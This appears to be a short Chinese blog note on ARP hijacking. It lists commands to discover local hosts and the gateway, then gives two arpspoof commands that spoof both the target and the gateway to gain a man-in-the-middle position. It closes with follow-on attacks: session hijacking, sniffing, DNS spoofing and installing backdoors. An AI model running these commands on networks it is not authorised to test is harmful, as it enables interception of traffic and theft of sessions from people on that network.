---
title: ARP劫持
categories:
  - cybersec
description: ARP劫持
date: 2025-03-15 20:46:53
tags:
---

# 获取 ip mac 地址信息

`ip a` 得到本机 ip 地址  
`ip route` 得到网关地址  
`arp-scan --interface=eth0 --localnet` 扫描统一子网下主机

# ARP劫持（成为中间人）

```bash
arpspoof -i eth0 -t 目标IP 网关IP   # 欺骗目标设备
arpspoof -i eth0 -t 网关IP 目标IP   # 欺骗网关（双向劫持）
```

# 进一步渗透

- 流量劫持与中间人攻击（MITM）  
- 会话劫持
- 数据嗅探
- DNS 欺骗
- 安装后门  